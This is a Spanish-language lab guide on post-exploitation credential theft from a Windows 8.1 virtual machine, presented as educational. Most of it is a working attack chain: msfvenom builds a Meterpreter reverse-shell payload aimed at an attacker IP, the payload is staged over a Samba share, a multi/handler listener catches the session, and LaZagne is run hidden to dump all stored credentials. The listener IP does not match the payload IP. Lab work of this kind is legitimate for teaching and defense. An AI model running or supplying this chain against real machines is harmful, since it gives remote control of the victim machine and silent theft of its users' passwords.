# 🧪 Laboratorio de Ingeniería Social — Extracción de Credenciales en Windows 8.1

## 📘 Descripción del laboratorio

Este laboratorio simula un escenario de post-explotación en un entorno virtual controlado. El objetivo es demostrar cómo un atacante puede extraer credenciales almacenadas en una máquina Windows 8.1 utilizando herramientas como Meterpreter y LaZagne, sin que el usuario lo note. Todo el ejercicio se realiza con fines educativos y de concientización en ciberseguridad.

## 🛠️ Herramientas utilizadas

- Kali Linux (máquina atacante)
- Windows 8.1 (máquina víctima)
- LaZagne — herramienta de extracción de credenciales
- Meterpreter — ejecución remota
- msfvenom / msfconsole — generación y manejo de payloads
- Samba — para compartir archivos entre máquinas virtuales

## 🎯 Objetivo

Mostrar cómo un atacante puede ejecutar herramientas de extracción de credenciales en una máquina Windows comprometida, usando acceso remoto y técnicas silenciosas. El laboratorio permite entender los riesgos y aplicar medidas de defensa en entornos reales.

## 🧪 Instrucciones paso a paso

### 1. Preparación del entorno

- Inicia Kali Linux y Windows 8.1 en máquinas virtuales.
- Asegúrate de que ambas máquinas estén en la misma red virtual (puente o NAT).

### 2. Instalación de dependencias en Kali
sudo apt update
sudo apt install git python3 python3-pip mingw-w64 -y
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne
pip3 install -r requirements.txt
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.158 LPORT=4444 -f exe -o payload.exe
cp /home/kali/Desktop/payload.exe /home/kali/samba_share/
sudo systemctl restart smbd
sudo systemctl start nmbd
sudo systemctl status smbd
####Acceder desde Windows a la carpeta compartida
________En el explorador de archivos de Windows, accede a \\<IP_Kali>\samba_share
________Copia payload.exe y LaZagne.exe al escritorio de Windows
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.101.83
set LPORT 4444
exploit
#######Ejecutar LaZagne desde sesión Meterpreter
execute -f "C:\\Users\\Administrator\\Desktop\\LaZagne.exe" -a "all -oA -output C:\\Users\\Administrator\\Desktop\\resultados" -H





